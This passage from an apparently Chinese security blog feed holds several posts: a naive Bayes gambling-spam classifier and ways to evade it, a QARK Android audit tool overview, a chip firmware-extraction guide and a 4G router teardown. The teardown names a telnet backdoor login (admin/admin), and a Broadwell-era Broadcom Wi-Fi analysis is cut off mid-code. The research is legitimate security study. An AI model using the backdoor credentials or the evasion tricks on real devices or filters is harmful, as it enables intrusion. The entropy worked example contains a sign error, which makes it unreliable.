[(&apos;六合彩&apos;, 0.96940055718810347), (&apos;游戏&apos;, 0.96940055718810347), (&apos;欢迎&apos;, 0.56393544907993931)]
</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="统计分析"><a href="#统计分析" class="headerlink" title="统计分析"></a>统计分析</h3><p>测试方法有留出法(hold-out)，k折交叉验证法(cross validation)，自助法(bootstrapping)，这里我们使用留出法，测试脚本默认每次从所有数据中选出60个句子当成测试数据，剩下的当成训练数据。重复进行测试10次。运行测试脚本</p>
<pre><code>&gt;&gt;&gt; python runanalysis.py
This may takes some time, Go get a coffee :D.
Building prefix dict from the default dictionary ...
Loading model from cache /var/folders/md/0251yy51045d6nknpkbn6dc80000gn/T/jieba.cache
Loading model cost 0.914 seconds.
Prefix dict has been built succesfully.
+Cherry---------------+------------+------------+
| Confusion matrix    | gamble.dat | normal.dat |
+---------------------+------------+------------+
| (Real)gamble.dat    |        249 |          0 |
| (Real)normal.dat    |         13 |        338 |
| Error rate is 2.17% |            |            |
+---------------------+------------+------------+
</code></pre><p>输出分类测试数据的平均错误率为2.17%，同时我们可以通过混淆矩阵对分类器进行分析：</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/QQ%E6%88%AA%E5%9B%BE20180408144928.jpg" alt=""></p>
<ul>
<li><p>查全率(recall)（能找出赌博类别句子的概率）</p>
<p>  真阳性/(真阳性+假阴性)<br>  249 / 249 = 100%</p>
</li>
<li><p>查准率(precision)（分类为赌博类别中的句子，确实是赌博类别的概率）</p>
<p>  真阳性/(真阳性+假阳性)<br>  249 / (249 + 13) = 95%</p>
</li>
</ul>
<p>如果业务的需求是尽可能找到潜在的阳性数据（例如癌症初检）那么就要求高查全率，不过对应的，高查全率会导致查准率降低。（可以这样理解，假如所有句子都判断成赌博类别，那么所有确实是赌博类别的句子确实都被检测到了，但是查准率变得很低。）影响查全率以及查准率的一点是训练数据数量的比例，日常的句子中，赌博类别的句子与正常类别的句子比例可能是1:50。也就是说随便给出一个句子，不用看内容，那么它有98%是正常的。不过在某些情况下，例如热门评论区打广告的用户就很多，那么这个比例就变成1:10或者1:20，这个比例是根据具体业务而调整的。<strong>训练数据也应该遵循这个比例，但是实现中，我们必须要找到大量独立分布的数据才能遵循这个比例，这就是机器学习数据常遇到的不均衡分类问题。要解决这个问题，可以引入Adaboost算法动态调整每个词语的权重。</strong>。我们可以通过-p参数输出ROC曲线：</p>
<p><img src="https://raw.githubusercontent.com/EngineGirl/enginegirl.github.io/master/images/bayes/auc.png" alt="roc"></p>
<p>ROC曲线横坐标代表的是假阳性（没有问题却被判断为有问题），纵坐标代表的是真阳性（有问题而且被判断出来），一个优秀的分类器尽可能维持高真阳性以及低假阳性。一般来说，如果一个分类器的ROC曲线包含了另外一个分类器的ROC曲线，代表此分类器在此数据集的分类效果更好。</p>
<h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><ul>
<li><a href="#上下文关联">上下文关联</a></li>
<li><a href="#分类器绕过">分类器绕过</a></li>
</ul>
<h3 id="上下文关联"><a href="#上下文关联" class="headerlink" title="上下文关联"></a>上下文关联</h3><p>当我们计算P(输入句子|类别)的时候，我们把输入句子分成了词语的集合，<strong>同时假定了输入句子中词语与词语之间没有上下文关系，</strong>其实这是不完全正确的，例如：</p>
<pre><code>警方召开了全省集中打击赌博违法犯罪活动...
</code></pre><p>从常识句子的上下文判断，<strong>集中打击</strong>出现在<strong>赌博违法犯罪</strong>之前的概率，要比<strong>召开</strong>出现在<strong>赌博违法犯罪</strong>之前的概率高，不过当我们把输入句子分成词语的集合的时候，把它们看成每个词语都是独立分布的。这也是此算法称为朴素贝叶斯的原因，如果我们有大量的数据集，计算出<strong>每个词语对应词袋模型其他词语的出现概率值的话，可以提高检测的准确率。</strong></p>
<p>要注意的是，训练数据选择与最后进行分类的数据必须尽量关联，如果要检测的句子与训练数据有非常大的差别，例如检测的内容包含大量的英文单词，但是训练数据却没有，那么分类器就无法进行正确的分类。同时，输入句子过短的话，分类器也无法很好地进行分类。因为分类的结果会很容易被其中的一两个词语所影响。</p>
<h4 id="分类器绕过"><a href="#分类器绕过" class="headerlink" title="分类器绕过"></a>分类器绕过</h4><p>分类器无法分辨重复内容或部分无意义文本，输入句子：</p>
<blockquote>
<p>车厘子车厘子车厘子车厘子</p>
<p>加入博彩121加qq看头像，很为温暖文科楼课文你问你看我呢额可能我呃让你听客啊啊爱看就是是过分过分你问人人官方代购极为。</p>
</blockquote>
<p>前两个是垃圾内容，但是即使我们添加垃圾内容的数据集，也很难判断正确。最后一个前一小段是赌博类别的句子，后面一长串是无意义或者正常类别的句子，分类器综合判断它是正确的句子。<strong>解决这个问题我们可以用一个简单的方法，计算句子的熵，也就是无序程度。</strong>每个句子都有合理的长度以及合理的无序程度，什么意思呢？句子的长度大约遵循正态分布，极长（不包含标点符号）或者极短的句子出现的概率比较低，同时，通常一个句子中的词语不会重复出现很多次，它的无序程度是在某个范围的。当我们看到前两个句子，因为它们词语的重复度非常高，所以句子的无序度非常低，如何计算句子的无序程度呢？</p>
<ol>
<li><p>我们找两个输入句子作为例子，先把输入句子进行分词</p>
<blockquote>
<p>车厘子是一只非常可爱的猫咪</p>
<p>车厘子车厘子车厘子车厘子</p>
</blockquote>
<pre><code>[车厘子，非常，可爱，猫咪]
[车厘子，车厘子，车厘子，车厘子]
</code></pre></li>
<li><p>计算每个词语出现的次数除于句子的词语数量：</p>
<p> P(车厘子) = P(非常) = P(可爱) = P(猫咪) = 1/4 (句子1)</p>
<p> P(车厘子) = 4/4 = 1 (句子2)</p>
<p> 通过计算熵的公式，带入每个概率值，最后除于句子的词语数量</p>
<pre><code>H = -sum(p(x)log2p(x))

H1 = ((1/4 * -2) - (1/4 * -2) - (1/4 * -2) - (1/4 * -2)) / 4= -2 / 4 = -1/2

H2 = 0
</code></pre></li>
</ol>
<p>可以看到，在同样的句子长度下，第一个句子的熵为-2，第二个为0，可以设置一个熵的范围，如果低于该值，代表句子可能是垃圾数据。一般来说，先进行垃圾文本过滤，然后进行贝叶斯模型的分类，在工程中会有更好的效果。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>理解了贝叶斯分类的原理，你就能根据自己的业务需求，来判断使用什么分词函数，使用哪些stop_word，可以定制适合业务的数据集，同时根据输出的被错误分类的数据以及混淆矩阵，做出对应的调整。</strong>如果有什么疑问，欢迎留言。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;贝叶斯模型在机器学习以及人工智能中都有出现，&lt;a href=&quot;https://github.com/Sunkist-Cherry/cherr
    
    </summary>
    
      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="贝叶斯分类" scheme="http://www.future-sec.com/tags/%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%88%86%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>QARK工具的介绍和原理分析</title>
    <link href="http://www.future-sec.com/introducing-qark.html"/>
    <id>http://www.future-sec.com/introducing-qark.html</id>
    <published>2018-04-07T16:00:00.000Z</published>
    <updated>2018-06-29T09:01:13.691Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>QARK的核心是一个静态代码分析工具，旨在识别基于Java的Android应用程序的潜在安全漏洞和关注点。QARK还试图提供动态生成的ADB（Android调试桥）命令，以帮助验证其检测到的潜在漏洞。它甚至可以动态地创建一个定制的测试应用程序，以即用APK的形式，专门设计来展示它发现的潜在问题。<br>QARK的设计是基于社区的，可供所有人免费使用。QARK被设计出来的主要目的和大多数的自动化检测工具一样是教育开发人员和信息安全人员了解与Android应用程序安全相关的潜在风险 ，相应的开发人员和评估人员就可以在开发和检测阶段，针对于APP移动应用进行检测，及时修改相应的风险点。</p>
<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>•    python 2.7.<br>•    JRE 1.6+（最好1.7+）<br>•    Ubuntu环境（最好）<br>•    未加固的测试APK；<br>•    一台root过的手机<br>在前提条件中，有提到未加固的APK，从简介中，我们就提到该工具就是一个静态代码分析的工具，在其中QARK的脚本中是没有脱壳的脚本，所以是需要未加固的APK，其中的ubuntu环境不是唯一的，但是我只在ubuntu成功过，所以我建议试用该环境。</p>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>QARK是一款易于使用的工具，能够找到Android应用程序中的常见安全漏洞。与商业产品不同，它可以100％免费使用。QARK提供教育信息，允许安全审查人员找到对漏洞的精确和深入的解释。在反编译APK时，QARK可以自动使用多个反编译器，利用它们的组合输出来产生出色的结果。最后，QARK与传统工具相比的主要优势仅仅是指出可能存在的漏洞，它可以产生ADB命令甚至功能齐全的APK，将假设的漏洞转化为“POC”漏洞利用。<br>包含在此工具尝试查找的安全漏洞类型中的有：<br>•    无意中导出的组件<br>•    未妥善保护的导出组件<br>•    易受拦截或窃听的intent<br>•    不正确的x.509证书验证<br>•    创建事件可读或事件可写的文件<br>•    可能泄漏数据的Activity<br>•    粘滞的intent的使用<br>•    不安全地创建了Pending Intents<br>•    发送不安全的广播Intent<br>•    嵌入在源中的私钥<br>•    弱密码学使用不当或不适用<br>•    潜在可利用的WebView配置<br>•    导出偏好活动<br>•    Tapjacking<br>•    启用备份的应用程序<br>•    可调试的应用程序<br>•    支持过时API版本的应用程序，具有已知的漏洞</p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>前面我们说过该工具就是静态代码分析的工具，所以首先我打开相应的qark.py脚本文件,其可以发现刚开始就使用到unpackAPK脚本，然后打开相应的unpackAPK,py，发现相应aapt和dex2jar，这里就可以知道还是老方法，对apk进行反编译，然后在进行相应的dex2jar把dex转换为jar文件，之后在进行查看源码。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image001.png" alt=""><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image002.png" alt=""><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image003.png" alt=""> </p>
<p>然后就是相应的代码静态分析，这里就需要对于检测项目的了解，其实说到底就是一个关键代码查找和匹配，因为这些检测项目大部分引起的原因就是编写代码没有注意到相关的安全措施，例如其中的组件暴露就是，组件的属性exported：设置为ture或者没有设置，则默认为true，这就会导致相应的组件暴露。<br>我们查看下mouble文件夹里面，基本上所有的检测项目都是这里的检测检测脚本。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image004.png" alt=""><br>我们就分析其中的cryptoFlaws.py这个脚本，从字面意思就是密码缺陷，那这个部分就是针对于移动应用加解密子之类的风险。我们直接打开来查看其中方法。<br>这里我们看到相应的寻找ECB的特殊关键字，这个是检测AES和DES是否存在弱加密（ECB模式）的风险。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image005.png" alt=""><br>这个地方是匹配PRIVATE\sKEY的1特殊关键字，寻找相应的加密算法的私钥，这个地方的私钥如果存在且是以明文形式存在，这个就是加密算法的密钥硬编码风险，会导致相关的加密算法被破解。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image006.png" alt=""><br>这里还有一个地方，但是方法被注释掉了，这个是匹配SecureRandom.setseed（）方法，这个是伪随机数的一个风险点。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image007.png" alt=""><br> 大部分的原理都是类似的。所以其他的脚本就看各位自己去分析。</p>
<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><p>QARK有两种模式：1.交互模式 2.无缝模式<br>交互模式使用户能够交互地一个接一个地选择选项。而无缝模式允许我们用一个命令完成整个工作。<br>我们主要看看交互模式的实际应用。<br>输入python qark.py<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image008.png" alt=""><br>接着会有选择apk或者soure，这些都是通过数字来进行选择。继续下去会有输入路径或者通过设备来进行检测。我们选择1，然后底下就开始提示是否导出mainfirst文件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image009.png" alt=""><br>接下来就直接导出相应的mainfist文件，这其实就是直接反编译获取到的。接下来就是先从mainfirst文件进行分析，分析相应组件暴露和allowback和debuggable等相关的风险点。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image010.png" alt=""><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image011.png" alt=""><br>接下里，我们继续查看，直接检测broadcast广播是否有附带相应的敏感信息，然后就是相应的脚本进行检测，例如x509证书检验，这些都是该工具具有的代码静态分析。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image012.png" alt=""><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image013.png" alt=""><br>最后会在qark的本身目录中的report.html文件，这个文件类似于mobsf生成的界面。这里面就是会把刚刚经过检测的所有风险都以报告的形式打印出来，都会在相应的选项中，详细的告诉你风险点存在的位置，以及相应的危害。<br>但是在这里我们只是看到很稀少的数据，其实这些数据只是mainfist文件暴露出来的风险点，但是代码中的分析根本没有进行分析。问题出在于apk本身，这是一个有进行加固的apk，我之前说过这个工具无法进行相应的脱壳，所以导致无法获取到相应的代码，就无法进行相应的分析，所以其他数据就是空的。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在安装的过程会有一个问题就是python no module named _curses的问题，这个问题最后解决了，经过对比python2.6 ，终于发现，原来 pythong2.7/lib-dynload 里没有相应的 curses 库，_curses_panel.so，_curses.so。说到底就是去缺少文件，所以此时你将python2.6 的 这2个so文件拷贝到 pythong2.7 的lib-dynload 文件夹下， 就解决了问题。或者你可以下载ncurses文件，然后重新跑下python就可以了。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/image014.png" alt=""><br>我们前面也说过这款工具是为了教育开发人员和信息安全人员了解与Android应用程序安全相关的潜在风险 ，相应的开发人员和评估人员就可以在开发和检测阶段，针对于APP移动应用进行检测，及时修改相应的风险点。<br>其实通过对于QARK的了解，我们不难看出这就是和大多数自动化工具一样就是，感觉就像个多了些脚步的Mobsf，作为一个安全评估人员，其实再多的检测工具也是辅助，我们仍然需要进行自己的分析，有些风险点也不一定是准确的，所以我们是需要好好利用该工具。</p>
<p>参考的文章：<br><a href="http://resources.infosecinstitute.com/qark-a-tool-for-automated-android-app-assessments/#gref" rel="external nofollow noopener noreferrer" target="_blank">http://resources.infosecinstitute.com/qark-a-tool-for-automated-android-app-assessments/#gref</a><br><a href="https://github.com/linkedin/qark" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/linkedin/qark</a><br>工具下载链接：<br><a href="https://github.com/linkedin/qark" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/linkedin/qark</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;QARK的核心是一个静态代码分析工具，旨在识别基于Java的Android应用程序的潜在安全漏洞和关注点。QARK还试图提供动态生成的ADB
    
    </summary>
    
      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="QARK" scheme="http://www.future-sec.com/tags/QARK/"/>
    
  </entry>
  
  <entry>
    <title>芯片安全系列-Let&#39;s cook!</title>
    <link href="http://www.future-sec.com/chip-security-let-us-cook.html"/>
    <id>http://www.future-sec.com/chip-security-let-us-cook.html</id>
    <published>2018-01-20T16:00:00.000Z</published>
    <updated>2018-06-29T08:59:11.900Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>芯片安全是针对芯片本身的安全研究，其在知识产权保护，防抄板山寨、加密破解、优化设计、漏洞挖掘和芯片木马等方面都具有深远意义，传统安全往往着眼于上层应用和驱动层面的安全，然而如果芯片存在本质的设计缺陷或安全漏洞，传统安全手段往往很难触及底层，前段时间英特尔芯片的“崩溃”（Meltdown）和“幽灵”（Spectre）漏洞，轰动整个世界，造成了巨额的损失，此次漏洞爆发就是因为芯片自身的设计缺陷所导致的，芯片级的安全研究是一项长期而艰难的工作，其是一门涉及多学科多门类的综合性研究，包括：微电子学、计算机科学、数学、物理学、化学、电磁学、光学等等。芯片分析方式主要包括非侵入式、半侵入式、侵入式、侧信道等。本文通过对某款蓝牙锁芯片的处理和固件提取，作为芯片分析的简单实例。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/dfghfghfhg.jpg" alt="dfghfghfhg"></p>
<h2 id="拆焊"><a href="#拆焊" class="headerlink" title="拆焊"></a>拆焊</h2><p>在PCB背面有一颗CC2541的蓝牙芯片，此款芯片采用QFN-40封装格式，没有暴露的可以直连外部引脚，厂商在量产时也把调试接口去掉了，为了获取芯片的固件内容，需要进行拆焊。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/fghgjty555.jpg" alt="fghgjty555"></p>
<p>拆焊所需工具包括：热风枪、焊枪、松香水、吸锡线、洗板水或无水酒精、无纺布、镊子等。热风枪温度调到360度，风速在5档左右，先在距离PCb上方3到5厘米处，给PCB预热几秒，然后缓缓下移到1厘米处，沿着芯片的四周匀速转动，枪口务必不要对准芯片的中心处，防止芯片过热，造成损毁，大概20秒左右即可融化芯片底部焊锡，另一只手用镊子夹住芯片，轻轻往上一提，芯片即可从PCB取下。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134552.jpg" alt="20180116_134552"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134549.jpg" alt="20180116_134549"></p>
<h2 id="清洁"><a href="#清洁" class="headerlink" title="清洁"></a>清洁</h2><p>取下芯片之后，芯片的底部会粘有很多未去除的焊锡和脏物，需要进一步清洁处理，首先滴上松香水，用焊枪使焊锡融化。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134618.jpg" alt="20180116_134618"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134719.jpg" alt="20180116_134719"></p>
<p>然后用吸锡线配合焊枪把多余的焊锡和脏物吸掉，反复几次。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134735.jpg" alt="20180116_134735"></p>
<p>处理完毕之后，用洗板水和无纺布擦洗芯片，彻底去除脏物残留，引脚应保持光亮，以防接触不良和短路。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134815.jpg" alt="20180116_134815"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134845.jpg" alt="20180116_134845"></p>
<p>焊锡、松香水和洗板水气味比较刺鼻，高温易伤手，工作环境需要注意通风，有条件可以配置防护服。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/breaking-bad-heisenberg-jesse-hazmat-suit-combo-sixth-scale-threezero-902883-28.jpg" alt="breaking-bad-heisenberg-jesse-hazmat-suit-combo-sixth-scale-threezero-902883-28"></p>
<h2 id="芯片读取"><a href="#芯片读取" class="headerlink" title="芯片读取"></a>芯片读取</h2><p>CC2541芯片是TI出品的一款蓝牙芯片，TI有专门的工具和软件来读取，包括：CCDebugger调试器和SmartRF Flash Programmer软件，因芯片已经拆下，可以通过转接板或烧录座连接芯片，引出相应的接口，然后连接CCDebugger进行固件的读取。</p>
<p>把处理好的芯片放入烧录座，需要正确放置芯片，可以通过芯片正面的小圆点确定方向。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134912.jpg" alt="20180116_134912"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_135324.jpg" alt="20180116_135324"></p>
<p>确认无误之后，压紧烧录座盖，连上CCDebugger。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_135403.jpg" alt="20180116_135403"></p>
<p>打开SmartRF Flash Programmer，选择Read flash into hex-file选项，在Flash image选项可以选择保存的路径和文件名，然后点Perform actions，即可开始读取。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116135409.jpg" alt="QQ截图20180116135409"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116135434.jpg" alt="QQ截图20180116135434"></p>
<p>读取的文件格式为HEX，然后根据对应的CPU指令编写进行反汇编。   </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/78B82770-AB46-4404-B195-2B28835DF2AC.jpg" alt="QQ截图20180116135452"></p>
<p>部分芯片另需进行开片和晶体电路修改等等深度处理，本文是伏宸实验室关于芯片安全的一篇先导性文章，后续将会有一系列关于芯片安全的文章，敬请期待。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;芯片安全是针对芯片本身的安全研究，其在知识产权保护，防抄板山寨、加密破解、优化设计、漏洞挖掘和芯片木马等方面都具有深远意义，传统安全往往着眼
    
    </summary>
    
      <category term="芯片安全" scheme="http://www.future-sec.com/categories/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="芯片安全" scheme="http://www.future-sec.com/tags/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>某4G无线路由终端分析</title>
    <link href="http://www.future-sec.com/analysis-of-a-4G-wireless-router.html"/>
    <id>http://www.future-sec.com/analysis-of-a-4G-wireless-router.html</id>
    <published>2018-01-19T16:00:00.000Z</published>
    <updated>2018-06-29T08:59:12.972Z</updated>
    
    <content type="html"><![CDATA[<h2 id="设备介绍"><a href="#设备介绍" class="headerlink" title="设备介绍"></a>设备介绍</h2><p>随着4G网络的大区域覆盖，移动端的网络速度得到大幅提升，此次分析的该款4G无线路由终端，就是通过sim卡连上LTE网络之后，在通过wifi模块将蜂窝网络转为wifi信号共享给其他设备使用，其原理与手机共享热点类似，因其便携省电等功能，目前在市场上的反响颇高，X宝销量达数万件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171902.jpg" alt="1224171902"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171219164331.jpg" alt="QQ截图20171219164331"></p>
<h2 id="硬件分析"><a href="#硬件分析" class="headerlink" title="硬件分析"></a>硬件分析</h2><p>话不多说，进入正题，拆掉背面螺丝，取出电池，揭掉正面盖板，在正面PCB上是一块全彩TFT屏幕，显示效果一般，屏幕下方有多个印字。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903.jpg" alt="1224171903"></p>
<p>左侧有两个焊点，分别是RXD和TXD口，可以通过UART模式调试。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903a.jpg" alt="1224171903a"></p>
<p>下方左侧是8口的JTAG调试口，加一个公用GND口，JTAG调试下篇会重点介绍。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903b.jpg" alt="1224171903b"></p>
<p>正下方靠近USB充电口位置是电源电压测试口，主要用来测量额定输入输出的电源电压。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171903c.jpg" alt="1224171903c"></p>
<p>拆掉PCB上的螺丝，翻转板子，背面包括SIM插槽、SD卡插槽以及核心处理芯片，出于保护和散热的目的，还加装了保护盖。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171904.jpg" alt="1224171904"></p>
<p>拆掉盖子，先看下主要芯片的型号和用途，这对进一步分析有很大帮助。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/1224171905-bianhao.jpg" alt="1224171905-bianhao"></p>
<p>图上标注1的芯片通过查看印字分析,为芯天下出产的PN26Q01AWSIUG 型存储芯片，存储容量为1G。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191431.jpg" alt="20171218_191431"></p>
<p>标注2的芯片为中兴微电子生产的ZX297520型手机modem芯片，支持TD-LTE/FDD LTE /WCDMA/TD-SCDMA/EDGE全模制式。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191405.jpg" alt="20171218_191405"></p>
<p>标注3的芯片为Realtek生产的使用非常广泛的RTL8189ES无线wifi芯片，是一款高性能、低功耗、体积小SDIO接口无线模组。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191336.jpg" alt="20171218_191336"></p>
<p>标注4的芯片为中兴微电子生产的ZX23422电源管理芯片。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191524.jpg" alt="20171218_191524"></p>
<p>标注5的芯片为锐迪科（RDA）生产的RPM6743射频前端芯片，是蜂窝网络和wifi信号广播收发的重要组成部分。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20171218_191505.jpg" alt="20171218_191505"></p>
<h2 id="串口调试"><a href="#串口调试" class="headerlink" title="串口调试"></a>串口调试</h2><p>在认识设备的基本构成之后，重新组装好，首先通过正面的UART调试串口来进行初步调试，采用夹具连接RXD、TXD两个调试点，在设备通电情况下，只需把转接板上的GND口与板子上的公用GND口相连即可。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image89.jpg" alt="image89"></p>
<p>因串口输出信息过多，影响观察输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image90.jpg" alt="image90"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image91.jpg" alt="image91"></p>
<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>查看当前进程，通过串口输出信息，发现该终端采用goahead作为web服务器，4719端口存在一个telnet服务。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/hgjghjtyut.jpg" alt="命令"></p>
<p>连接wifi进入web管理界面，查看设备ip。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15136011800782.jpg" alt="15136011800782"></p>
<p>通过telnet连接设备，使用弱口令弱口令：admin、admin即可登录。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15136011175389.jpg" alt="15136011175389"></p>
<p>该账号为后门账号。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15136012728967.jpg" alt="15136012728967">查看开启的端口。</p>
<p>如果需要继续分析，可以通过tftp 传输文件至本地，例如/bin/goahead。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;设备介绍&quot;&gt;&lt;a href=&quot;#设备介绍&quot; class=&quot;headerlink&quot; title=&quot;设备介绍&quot;&gt;&lt;/a&gt;设备介绍&lt;/h2&gt;&lt;p&gt;随着4G网络的大区域覆盖，移动端的网络速度得到大幅提升，此次分析的该款4G无线路由终端，就是通过sim卡连上LTE网络之后，
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>BROADCOM WI-FI芯片漏洞分析三</title>
    <link href="http://www.future-sec.com/broadcom-wifi-3.html"/>
    <id>http://www.future-sec.com/broadcom-wifi-3.html</id>
    <published>2018-01-18T16:00:00.000Z</published>
    <updated>2018-06-29T08:59:12.388Z</updated>
    
    <content type="html"><![CDATA[<h2 id="切入点"><a href="#切入点" class="headerlink" title="切入点"></a>切入点</h2><p>从解析wme信标帧开始<br>参考：<a href="http://www.freebuf.com/vuls/142099.html" rel="external nofollow noopener noreferrer" target="_blank">freebuf博客：完整解析博通WiFi芯片Broadpwn漏洞</a><br>先找到固件中的漏洞位置，如下代码所示，有几个关键的数据帧标志类型。根据管理帧的类型在 VMG-1312 的源代码定位到处理这部分管理帧数据包的代码。</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">frame_type = *(unsigned <span class="variable">__int16</span> *)(arg + <span class="number">8</span>);  <span class="comment">// arg-&gt;frame_type</span></div><div class="line">  cfg = *(<span class="variable">_DWORD</span> *)(arg + <span class="number">4</span>);                   <span class="comment">// 